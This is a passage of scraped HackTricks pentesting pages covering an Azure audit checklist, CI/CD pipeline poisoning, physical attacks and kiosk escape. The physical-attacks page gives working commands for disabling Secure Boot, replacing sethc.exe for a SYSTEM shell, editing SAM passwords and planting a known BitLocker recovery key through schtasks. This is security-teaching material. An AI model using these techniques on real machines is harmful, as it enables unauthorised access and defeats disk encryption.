(https://github.com/nccgroup/azucar)\n#Run it from its folder\n.\n\\\nAzucar.ps1\n-AuthMode\nInteractive\n-ForceAuth\n-ExportTo\nEXCEL\n‚Äã\n#Azure-CIS-Scanner,CIS scanner for Azure (https://github.com/kbroughton/azure_cis_scanner)\npip3\ninstall\nazure-cis-scanner\n#Install\nazscan\n#Run, login before with `az login`\nAttack Graph\n‚Äã\nStormspotter\ncreates an ‚Äúattack graph‚Äù of the resources in an Azure subscription. It enables red teams and pentesters to visualize the attack surface and pivot opportunities within a tenant, and supercharges your defenders to quickly orient and prioritize incident response work.\nMore checks\nCheck for a\nhigh number of Global Admin\n(between 2-4 are recommended). Access it on:\nhttps://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Overview\n‚Äã\nGlobal admins should have MFA activated. Go to Users and click on Multi-Factor Authentication button.\nDedicated admin account shouldn't have mailboxes (they can only have mailboxes if they have Office 365).\nLocal AD shouldn't be sync with Azure AD if not needed(\nhttps://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/AzureADConnect\n). And if synced Password Hash Sync should be enabled for reliability. In this case it's disabled:\nGlobal Administrators\nshouldn't be synced from a local AD. Check if Global Administrators emails uses the domain\nonmicrosoft.com\n. If not, check the source of the user, the source should be Azure Active Directory, if it comes from Windows Server AD, then report it.\nStandard tier\nis recommended instead of free tier (see the tier being used in\nPricing & Settings\nor in\nhttps://portal.azure.com/#blade/Microsoft_Azure_Security/SecurityMenuBlade/24\n)\nPeriodic SQL servers scans\n:\nSelect the SQL server\n-->\nMake sure that 'Advanced data security' is set to 'On'\n-->\nUnder 'Vulnerability assessment settings', set 'Periodic recurring scans' to 'On', and configure a storage account for storing vulnerability assessment scan results\n-->\nClick Save\nLack of App Services restrictions\n: Look for \"App Services\" in Azure (\nhttps://portal.azure.com/#blade/HubsExtension/BrowseResource/resourceType/Microsoft.Web%2Fsites\n) and check if anyone is being used. In that case check go through each App checking for \"Access Restrictions\" and there aren't rules, report it. The access to the app service should be restricted according to the needs.\nOffice365\nYou need\nGlobal Admin\nor at least\nGlobal Admin Reader\n(but note that Global Admin Reader is a little bit limited). However, those limitations appear in some PS modules and can be bypassed accessing the features\nvia the web application\n.\nOther Cloud Pentesting Guides\n‚Äã\nhttps://hackingthe.cloud\n‚Äã\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting CI/CD -\nPrevious\nTODO\nNext\n- Pentesting Cloud\nKubernetes Pentesting\nLast modified\n2mo ago"
    },
    {
        "title": "Pentesting CI/CD (Github, Jenkins, Terraform...)",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/pentesting-ci-cd-methodology",
        "text": "Pentesting CI/CD Methodology\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nIntroduction\nDev environments have become a major part of today‚Äôs attack surface. And within them, the most lucrative assets are the systems responsible for\nCI and CD\n‚Äî those that build, test, and deploy code ‚Äî and typically possess the\nsecrets and access\nto the most critical assets of the organization. So it‚Äôs only natural that attackers are continuously on the lookout for novel ways to gain access to these systems.\nVCS\nVCS stands for\nVersion Control System\n, this systems allows developers to\nmanage their source code\n. The most common one is\ngit\nand you will usually find companies using it in one of the following\nplatforms\n:\nGithub\nGitlab\nBitbucket\nGitea\nCloud providers (they offer their own VCS platforms)\nPipelines\nPipelines allow developers to\nautomate the execution of code\n(for building, testing, deploying... purposes) after certain actions occurs: A push, a PR, cron... They are terrible useful to a\nutomate all the steps from development to production\n.\nHowever, these systems need to be\nexecuted somewhere\nand usually with\nprivileged credentials to deploy code\n.\nVCS Pentesting Methodology\nEven if some VCS platforms allow to create pipelines for this section we are going to analyze only potential attacks to the control of the source code.\nPlatforms that contains the source code of your project contains sensitive information and people need to be very careful with the permissions granted inside this platform. These are some common problems across VCS platforms that attacker could abuse:\nLeaks\n: If your code contains leaks in the commits and the attacker can access the repo (because it's public or because he has access), he could discover the leaks.\nAccess\n: If an attacker can\naccess to an account inside the VCS platform\nhe could gain\nmore visibility and permissions\n.\nRegister\n: Some platforms will just allow external users to create an account.\nSSO\n: Some platforms won't allow users to register, but will allow anyone to access with a valid SSO (so an attacker could use his github account to enter for example).\nCredentials\n: Username+Pwd, personal tokens, ssh keys, Oauth tokens, cookies... there are several kind of tokens a user could steal to access in some way a repo.\nWebhooks\n: VCS platforms allow to generate webhooks. If they are\nnot protected\nwith non visible secrets an\nattacker could abuse them\n.\nIf no secret is in place, the attacker could abuse the webhook of the third party platform\nIf the secret is in the URL, the same happens and the attacker also have the secret\nCode compromise:\nIf a malicious actor has some kind of\nwrite\naccess over the repos, he could try to\ninject malicious code\n. In order to be successful he might need to\nbypass branch protections\n. These actions can be performed with different goals in mid:\nCompromise the main branch to\ncompromise production\n.\nCompromise the main (or other branches) to\ncompromise developers machines\n(as they usually execute test, terraform or other things inside the repo in their machines).\nCompromise the pipeline\n(check next section)\nPipelines Pentesting Methodology\nThe most common way to define a pipeline, is by using a\nCI configuration file hosted in the repository\nthe pipeline builds. This file describes the order of executed jobs, conditions that affect the flow, and build environment settings.\nThese files typically have a consistent name and format, for example ‚Äî Jenkinsfile (Jenkins), .gitlab-ci.yml (GitLab), .circleci/config.yml (CircleCI), and the GitHub Actions YAML files located under .github/workflows. When triggered, the pipeline job\npulls the code\nfrom the selected source (e.g. commit / branch), and\nruns the commands specified in the CI configuration file\nagainst that code.\nTherefore the ultimate goal of the attacker is to somehow\ncompromise those configuration files\nor the\ncommands they execute\n.\nPPE - Poisoned Pipeline Execution\nThe Poisoned Pipeline Execution (PPE) vector\nabuses permissions against an SCM repository\n, in a way that causes a CI pipeline to execute malicious commands. Users that have permissions to\nmanipulate the CI configuration files, or other files which the CI pipeline job relies on\n, can modify them to contain\nmalicious command\ns, ultimately ‚Äúpoisoning‚Äù the CI pipeline executing these commands.\nFor a malicious actor to be successful performing a PPE attack he needs to be able to:\nHave\nwrite access to the VCS platform\n, as usually pipelines are triggered when a push or a pull request is performed. (Check the VCS pentesting methodology for a summary of ways to get access).\nNote that sometimes an\nexternal PR count as \"write access\"\n.\nEven if he has write permissions, he needs to be sure he can\nmodify the CI config file or other files the config is relying on\n.\nFor this, he might need to be able to\nbypass branch protections\n.\nThere are 3 PPE flavours:\nD-PPE\n: A\nDirect PPE\nattack occurs when the actor\nmodifies the CI config\nfile that is going to be executed.\nI-DDE\n: An\nIndirect PPE\nattack occurs when the actor\nmodifies\na\nfile\nthe CI config file that is going to be executed\nrelays on\n(like a make file or a terraform config).\nPublic PPE or 3PE\n: In some cases the pipelines can be\ntriggered by users that doesn't have write access in the repo\n(and that might not even be part of the org) because they can send a PR.\n3PE Command Injection\n: Usually, CI/CD pipelines will\nset environment variables\nwith\ninformation about the PR\n. If that value can be controlled by an attacker (like the title of the PR) and is\nused\nin a\ndangerous place\n(like executing\nsh commands\n), an attacker might\ninject commands in there\n.\nExploitation Benefits\nKnowing the 3 flavours to poison a pipeline, lets check what an attacker could obtain after a successful exploitation:\nSecrets\n: As it was mentioned previously, pipelines require\nprivileges\nfor their jobs (retrieve the code, build it, deploy it...) and this privileges are usually\ngranted in secrets\n. These secrets are usually accessible via\nenv variables or files inside the system\n. Therefore an attacker will always try to exfiltrate as much secrets as possible.\nDepending on the pipeline platform the attacker\nmight need to specify the secrets in the config\n. This means that is the attacker cannot modify the CI configuration pipeline (\nI-PPE\nfor example), he could\nonly exfiltrate the secrets that pipeline has\n.\nComputation\n: The code is executed somewhere, depending on where is executed an attacker might be able to pivot further.\nOn-Premises\n: If the pipelines are executed on premises, an attacker might end in an\ninternal network with access to more resources\n.\nCloud\n: The attacker could access\nother machines in the cloud\nbut also could\nexfiltrate\nIAM roles/service accounts\ntokens\nfrom it to obtain\nfurther access inside the cloud\n.\nPlatforms machine\n: Sometimes the jobs will be execute inside the\npipelines platform machines\n, which usually are inside a cloud with\nno more access\n.\nSelect it:\nSometimes the\npipelines platform will have configured several machines\nand if you can\nmodify the CI configuration file\nyou can\nindicate where you want to run the malicious code\n. In this situation, an attacker will probably run a reverse shell on each possible machine to try to exploit it further.\nCompromise production\n: If you ware inside the pipeline and the final version is built and deployed from it, you could\ncompromise the code that is going to end running in production\n.\nMore relevant info\nTools & CIS Benchmark\n****\nChain-bench\nis an open-source tool for auditing your software supply chain stack for security compliance based on a new\nCIS Software Supply Chain benchmark\n. The auditing focuses on the entire SDLC process, where it can reveal risks from code time into deploy time.\nTop 10 CI/CD Security Risk\nCheck this interesting article about the top 10 CI/CD risks according to Cider:\nhttps://www.cidersecurity.io/top-10-cicd-security-risks/\n‚Äã\nLabs\nOn each platform that you can run locally you will find how to launch it locally so you can configure it as you want to test it\nGitea + Jenkins lab:\nhttps://github.com/cider-security-research/cicd-goat\n‚Äã\nAutomatic Tools\n****\nCheckov\n:\nCheckov\nis a static code analysis tool for infrastructure-as-code.\nReferences\n‚Äã\nhttps://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422\n‚Äã\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nWelcome! -\nPrevious\nHackTricks Cloud\nNext\n- Pentesting CI/CD\nGithub Security\nLast modified\n1mo ago"
    },
    {
        "title": "Physical Attacks",
        "url": "https://book.hacktricks.xyz/hardware-physical-access/physical-attacks",
        "text": "Physical Attacks\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBIOS password\nThe battery\nMost of the\nmotherbords\nhave a\nbattery\n. If you\nremove\nit\n30min\nthe settings of the BIOS will be\nrestarted\n(password included).\nJumper CMOS\nMost of the\nmotherboards\nhave a\njumper\nthat can restart the settings. This jumper connects a central pin with another, if you\nconnect thoses pins the motherbord will be reseted\n.\nLive Tools\nIf you could\nrun\nfor example a\nKali\nLinux from a Live CD/USB you could use tools like\nkillCmos\nor\nCmosPWD\n(this last one is included in Kali) you could try to\nrecover the password of the BIOS\n.\nOnline BIOS password recovery\nPut the password of the BIOS\n3 times wrong\n, then the BIOS will\nshow an error messag\ne and it will be blocked.\nVisit the page\nhttps://bios-pw.org\nand\nintroduce the error code\nshown by the BIOS and you could be lucky and get a\nvalid password\n(the\nsame search could show you different passwords and more than 1 could be valid\n).\nUEFI\nTo check the settings of the UEFI and perform some kind of attack you should try\nchipsec\n.\nUsing this tool you could easily disable the Secure Boot:\npython chipsec_main.py -module exploits.secure.boot.pk\nRAM\nCold boot\nThe\nRAM memory is persistent from 1 to 2 minutes\nfrom the time the computer is powered off. If you apply\ncold\n(liquid nitrogen, for example) on the memory card you can extend this time up to\n10 minutes\n.\nThen, you can do a\nmemory dump\n(using tools like dd.exe, mdd.exe, Memoryze, win32dd.exe or DumpIt) to analyze the memory.\nYou should\nanalyze\nthe memory\nusing volatility\n.\n‚Äã\nINCEPTION\n‚Äã\nInception is a\nphysical memory manipulation\nand hacking tool exploiting PCI-based DMA. The tool can attack over\nFireWire\n,\nThunderbolt\n,\nExpressCard\n, PC Card and any other PCI/PCIe HW interfaces.\nConnect\nyour computer to the victim computer over one of those\ninterfaces\nand\nINCEPTION\nwill try to\npatch\nthe\npyshical memory\nto give you\naccess\n.\nIf INCEPTION succeeds, any password introduced will be valid.\nIt doesn't work with Windows10.\nLive CD/USB\nSticky Keys and more\nSETHC:\nsethc.exe\nis invoked when SHIFT is pressed 5 times\nUTILMAN:\nUtilman.exe\nis invoked by pressing WINDOWS+U\nOSK:\nosk.exe\nis invoked by pressing WINDOWS+U, then launching the on-screen keyboard\nDISP:\nDisplaySwitch.exe\nis invoked by pressing WINDOWS+P\nThese binaries are located inside\nC:\\Windows\\System32\n. You can\nchange\nany of them for a\ncopy\nof the binary\ncmd.exe\n(also in the same folder) and any time that you invoke any of those binaries a command prompt as\nSYSTEM\nwill appear.\nModifying SAM\nYou can use the tool\nchntpw\nto\nmodify the\nSAM\nfile\nof a mounted Windows filesystem. Then, you could change the password of the Administrator user, for example.\nThis tool is available in KALI.\nchntpw -h\nchntpw -l <path_to_SAM>\nInside a Linux system you could modify the\n/etc/shadow\nor\n/etc/passwd\nfile.\nKon-Boot\nKon-Boot\nis one of the best tools around which can log you into Windows without knowing the password. It works by\nhooking into the system BIOS and temporarily changing the contents of the Windows kernel\nwhile booting (new versions work also with\nUEFI\n). It then allows you to enter\nanything as the password\nduring login. The next time you start the computer without Kon-Boot, the original password will be back, the temporary changes will be discarded and the system will behave as if nothing has happened.\nRead More:\nhttps://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/\n‚Äã\nIt is a live CD/USB that can\npatch the memory\nso you\nwon't need to know the password to login\n.\nKon-Boot also performs the\nStickyKeys\ntrick so you could press\nShift\n5 times to get an Administrator cmd\n.\nRunning Windows\nInitial shortcuts\nBooting shortcuts\nsupr - BIOS\nf8 - Recovery mode\nsupr\n- BIOS ini\nf8\n- Recovery mode\nShitf\n(after the windows banner) - Go to login page instead of autologon (avoid autologon)\nBAD USBs\nRubber Ducky tutorials\n‚Äã\nTutorial 1\n‚Äã\n‚Äã\nTutorial 2\n‚Äã\nTeensyduino\n‚Äã\nPayloads and tutorials\n‚Äã\nThere are also tons of tutorials about\nhow to create your own bad USB\n.\nVolume Shadow Copy\nWith administrators privileges and powershell you could make a copy of the SAM file.\nSee this code\n.\nBypassing Bitlocker\nBitlocker uses\n2 passwords\n. The one used by the\nuser\n, and the\nrecovery\npassword (48 digits).\nIf you are lucky and inside the current session of Windows exists the file\nC:\\Windows\\MEMORY.DMP\n(It is a memory dump) you could try to\nsearch inside of it the recovery password\n. You can\nget this file\nand a\ncopy of the filesytem\nand then use\nElcomsoft Forensic Disk Decryptor\nto get the content (this will only work if the password is inside the memory dump). You could also\nforce the memory dump\nusing\nNotMyFault\nof\nSysinternals,\nbut this will reboot the system and has to be executed as Administrator.\nYou could also try a\nbruteforce attack\nusing\nPassware Kit Forensic\n.\nSocial Engineering\nFinally, you could make the user add a new recovery password making him executed as administrator:\nschtasks /create /SC ONLOGON /tr\n\"c:/windows/system32/manage-bde.exe -protectors -add c: -rp 000000-000000-000000-000000-000000-000000-000000-000000\"\n/tn tarea /RU SYSTEM /f\nThis will add a new recovery key (composed of 48 zeros) in the next login.\nTo check the valid recovery keys you can execute:\nmanage-bde -protectors -get c:\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nCSS Injection Code\nNext\n- Hardware/Physical Access\nEscaping from KIOSKs\nLast modified\n1mo ago"
    },
    {
        "title": "Escaping from KIOSKs",
        "url": "https://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications",
        "text": "Escaping from KIOSKs\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCheck for possible actions inside the GUI application\nCommon Dialogs\nare those options of\nsaving a file\n,\nopening a file\n, selecting a font, a color... Most of them will\noffer a full Explorer functionality\n. This means that you will be able to access Explorer functionalities if you can access these options:\nClose/Close as\nOpen/Open with\nPrint\nExport/Import\nSearch\nScan\nYou should check if you can:\nModify or create new files\nCreate symbolic links\nGet access to restricted areas\nExecute other apps\nCommand Execution\nMaybe\nusing a _Open with\n_** option** you can open/execute some kind of shell.\nWindows\nFor example\ncmd.exe, command.com, Powershell/Powershell ISE, mmc.exe, at.exe, taskschd.msc...\nfind more binaries that can be used to execute commands (and perform unexpected actions) here:\nhttps://lolbas-project.github.io/\n‚Äã\n*NIX __\nbash, sh, zsh...\nMore here:\nhttps://gtfobins.github.io/\n‚Äã\nWindows\nBypassing path restrictions\nEnvironment variables\n: There are a lot of environment variables that are pointing to some path\nOther protocols\n:\nabout:, data:, ftp:, file:, mailto:, news:, res:, telnet:, view-source:\nSymbolic links\nShortcuts\n: CTRL+N (open new session), CTRL+R (Execute Commands), CTRL+SHIFT+ESC (Task Manager), Windows+E (open explorer), CTRL-B, CTRL-I (Favourites), CTRL-H (History), CTRL-L, CTRL-O (File/Open Dialog), CTRL-P (Print Dialog), CTRL-S (Save As)\nHidden Administrative menu: CTRL-ALT-F8, CTRL-ESC-F9\nShell URIs\n:\nshell:Administrative Tools, shell:DocumentsLibrary, shell:Librariesshell:UserProfiles, shell:Personal, shell:SearchHomeFolder, shell:Systemshell:NetworkPlacesFolder, shell:SendTo, shell:UsersProfiles, shell:Common Administrative Tools, shell:MyComputerFolder, shell:InternetFolder\nUNC paths\n: Paths to connect to shared folders. You should try to connect to the C$ of the local machine (\"\\\\127.0.0.1\\c$\\Windows\\System32\")\nMore UNC paths:\nUNC\nUNC\nUNC\n%ALLUSERSPROFILE%\n%APPDATA%\n%CommonProgramFiles%\n%COMMONPROGRAMFILES(x86)%\n%COMPUTERNAME%\n%COMSPEC%\n%HOMEDRIVE%\n%HOMEPATH%\n%LOCALAPPDATA%\n%LOGONSERVER%\n%PATH%\n%PATHEXT%\n%ProgramData%\n%ProgramFiles%\n%ProgramFiles(x86)%\n%PROMPT%\n%PSModulePath%\n%Public%\n%SYSTEMDRIVE%\n%SYSTEMROOT%\n%TEMP%\n%TMP%\n%USERDOMAIN%\n%USERNAME%\n%USERPROFILE%\n%WINDIR%\n‚Äã\nDownload Your Binaries\nConsole:\nhttps://sourceforge.net/projects/console/\nExplorer:\nhttps://sourceforge.net/projects/explorerplus/files/Explorer%2B%2B/\nRegistry editor:\nhttps://sourceforge.net/projects/uberregedit/\n‚Äã\nAccessing filesystem from the browser\nPATH\nPATH\nPATH\nPATH\nFile:/C:/windows\nFile:/C:/windows/\nFile:/C:/windows\\\nFile:/C:\\windows\nFile:/C:\\windows\\\nFile:/C:\\windows/\nFile://C:/windows\nFile://C:/windows/\nFile://C:/windows\\\nFile://C:\\windows\nFile://C:\\windows/\nFile://C:\\windows\\\nC:/windows\nC:/windows/\nC:/windows\\\nC:\\windows\nC:\\windows\\\nC:\\windows/\n%WINDIR%\n%TMP%\n%TEMP%\n%SYSTEMDRIVE%\n%SYSTEMROOT%\n%APPDATA%\n%HOMEDRIVE%\n%HOMESHARE\n‚Äã\nShortCuts\nSticky Keys ‚Äì Press SHIFT 5 times\nMouse Keys ‚Äì SHIFT+ALT+NUMLOCK\nHigh Contrast ‚Äì SHIFT+ALT+PRINTSCN\nToggle Keys ‚Äì Hold NUMLOCK for 5 seconds\nFilter Keys ‚Äì Hold right SHIFT for 12 seconds\nWINDOWS+F1 ‚Äì Windows Search\nWINDOWS+D ‚Äì Show Desktop\nWINDOWS+E ‚Äì Launch Windows Explorer\nWINDOWS+R ‚Äì Run\nWINDOWS+U ‚Äì Ease of Access Centre\nWINDOWS+F ‚Äì Search\nSHIFT+F10 ‚Äì Context Menu\nCTRL+SHIFT+ESC ‚Äì Task Manager\nCTRL+ALT+DEL ‚Äì Splash screen on newer Windows versions\nF1 ‚Äì Help F3 ‚Äì Search\nF6 ‚Äì Address Bar\nF11 ‚Äì Toggle full screen within Internet Explorer\nCTRL+H ‚Äì Internet Explorer History\nCTRL+T ‚Äì Internet Explorer ‚Äì New Tab\nCTRL+N ‚Äì Internet Explorer ‚Äì New Page\nCTRL+O ‚Äì Open File\nCTRL+S ‚Äì Save CTRL+N ‚Äì New RDP / Citrix\nSwipes\nSwipe from the left side to the right to see all open Windows, minimizing the KIOSK app and accessing the whole OS directly;\nSwipe from the right side to the left to open Action Center, minimizing the KIOSK app and accessing the whole OS directly;\nSwipe in from the top edge to make the title bar visible for an app opened in full screen mode;\nSwipe up from the bottom to show the taskbar in a full screen app.\nInternet Explorer Tricks\n'Image Toolbar'\nIt's a toolbar that appears on the top-left of image when it's clicked. You will be able to Save, Print, Mailto, Open \"My Pictures\" in Explorer. The Kiosk needs to be using Internet Explorer.\nShell Protocol\nType this URLs to obtain an Explorer view:\nshell:Administrative Tools\nshell:DocumentsLibrary\nshell:Libraries\nshell:UserProfiles\nshell:Personal\nshell:SearchHomeFolder\nshell:NetworkPlacesFolder\nshell:SendTo\nshell:UserProfiles\nshell:Common Administrative Tools\nshell:MyComputerFolder\nshell:InternetFolder\nShell:Profile\nShell:ProgramFiles\nShell:System\nShell:ControlPanelFolder\nShell:Windows\nshell:::{21EC2020-3AEA-1069-A2DD-08002B30309D}\n--> Control Panel\nshell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\n--> My Computer\nshell:::{{208D2C60-3AEA-1069-A2D7-08002B30309D}}\n--> My Network Places\nshell:::{871C5380-42A0-1069-A2EA-08002B30309D}\n--> Internet Explorer\nBrowsers tricks\nBackup iKat versions:\n‚Äã\nhttp://swin.es/k/\nhttp://www.ikat.kronicd.net/\n\\\nCreate a common dialog using JavaScript and access file explorer:\ndocument.write('<input/type=file>')\nSource: https://medium.com/@Rend_/give-me-a-browser-ill-give-you-a-shell-de19811defa0\niPad\nGestures and bottoms\nSwipe up with four (or five) fingers / Double-tap Home button\nTo view the multitask view and change App\nSwipe one way or another with four or five fingers\nIn order to change to the next/last App\nPinch the screen with five fingers / Touch Home button / Swipe up with 1 finger from the bottom of the screen in a quick motion to the up\nTo access Home\nSwipe one finger from the bottom of the screen just 1-2 inches (slow)\nThe dock will appear\nSwipe down from the top of the display with 1 finger\nTo view your notifications\nSwipe down with 1 finger the top-right corner of the screen\nTo see iPad Pro's control centre\nSwipe 1 finger from the left of the screen 1-2 inches\nTo see Today view\nSwipe fast 1 finger from the centre of the screen to the right or left\nTo change to next/last App\nPress and hold the On/\nOff\n/Sleep button at the upper-right corner of the\niPad +\nMove the Slide to\npower off\nslider all the way to the right,\nTo power off\nPress the On/\nOff\n/Sleep button at the upper-right corner of the\niPad and the Home button for a few second\nTo force a hard power off\nPress the On/\nOff\n/Sleep button at the upper-right corner of the\niPad and the Home button quickly\nTo take a screenshot that will pop up in the lower left of the display. Press both buttons at the same time very briefly as if you hold them a few seconds a hard power off will be performed.\nShortcuts\nYou should have an iPad keyboard or a USB keyboard adaptor. Only shortcuts that could help escaping from the application will be shown here.\nKey\nName\n‚åò\nCommand\n‚å•\nOption (Alt)\n‚áß\nShift\n‚Ü©\nReturn\n‚á•\nTab\n^\nControl\n‚Üê\nLeft Arrow\n‚Üí\nRight Arrow\n‚Üë\nUp Arrow\n‚Üì\nDown Arrow\nSystem shortcuts\nThese shortcuts are for the visual settings and sound settings, depending on the use of the iPad.\nShortcut\nAction\nF1\nDim Sscreen\nF2\nBrighten screen\nF7\nBack one song\nF8\nPlay/pause\nF9\nSkip song\nF10\nMute\nF11\nDecrease volume\nF12\nIncrease volume\n‚åò Space\nDisplay a list of available languages; to choose one, tap the space bar again.\niPad navigation\nShortcut\nAction\n‚åòH\nGo to Home\n‚åò‚áßH (Command-Shift-H)\nGo to Home\n‚åò (Space)\nOpen Spotlight\n‚åò‚á• (Command-Tab)\nList last ten used apps\n‚åò~\nGo t the last App\n‚åò‚áß3 (Command-Shift-3)\nScreenshot (hovers in bottom left to save or act on it)\n‚åò‚áß4\nScreenshot and open it in the editor\nPress and hold ‚åò\nList of shortcuts available for the App\n‚åò‚å•D (Command-Option/Alt-D)\nBrings up the dock\n^‚å•H (Control-Option-H)\nHome button\n^‚å•H H (Control-Option-H-H)\nShow multitask bar\n^‚å•I (Control-Option-i)\nItem chooser\nEscape\nBack button\n‚Üí (Right arrow)\nNext item\n‚Üê (Left arrow)\nPrevious item\n‚Üë‚Üì (Up arrow, Down arrow)\nSimultaneously tap selected item\n‚å• ‚Üì (Option-Down arrow)\nScroll down\n‚å•‚Üë (Option-Up arrow)\nScroll up\n‚å•‚Üê or ‚å•‚Üí (Option-Left arrow or Option-Right arrow)\nScroll left or right\n^‚å•S (Control-Option-S)\nTurn VoiceOver speech on or off\n‚åò‚áß‚á• (Command-Shift-Tab)\nSwitch to the previous app\n‚åò‚á• (Command-Tab)\nSwitch back to the original app\n‚Üê+‚Üí, then Option + ‚Üê or Option+‚Üí\nNavigate through Dock\nSafari shortcuts\nShortcut\nAction\n‚åòL (Command-L)\nOpen Location\n‚åòT\nOpen a new tab\n‚åòW\nClose the current tab\n‚åòR\nRefresh the current tab\n‚åò.\nStop loading the current tab\n^‚á•\nSwitch to the next tab\n^‚áß‚á• (Control-Shift-Tab)\nMove to the previous tab\n‚åòL\nSelect the text input/URL field to modify it\n‚åò‚áßT (Command-Shift-T)\nOpen last closed tab (can be used several times)\n‚åò[\nGoes back one page in your browsing history\n‚åò]\nGoes forward one page in your browsing history\n‚åò‚áßR\nActivate Reader Mode\nMail shortcuts\nShortcut\nAction\n‚åòL\nOpen Location\n‚åòT\nOpen a new tab\n‚åòW\nClose the current tab\n‚åòR\nRefresh the current tab\n‚åò.\nStop loading the current tab\n‚åò‚å•F (Command-Option/Alt-F)\nSearch in your mailbox\nReferences\n‚Äã\nhttps://www.macworld.com/article/2975857/6-only-for-ipad-gestures-you-need-to-know.html\n‚Äã\n‚Äã\nhttps://www.tomsguide.com/us/ipad-shortcuts,news-18205.html\n‚Äã\n‚Äã\nhttps://thesweetsetup.com/best-ipad-keyboard-shortcuts/\n‚Äã\n‚Äã\nhttp://www.iphonehacks.com/2018/03/ipad-keyboard-shortcuts.html\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHardware/Physical Access -\nPrevious\nPhysical Attacks\nNext\nShow file extensions\nLast modified\n6mo ago"
    },
    {
        "title": "Firmware Analysis",
        "url": "https://book.hacktricks.xyz/hardware-physical-access/firmware-analysis",
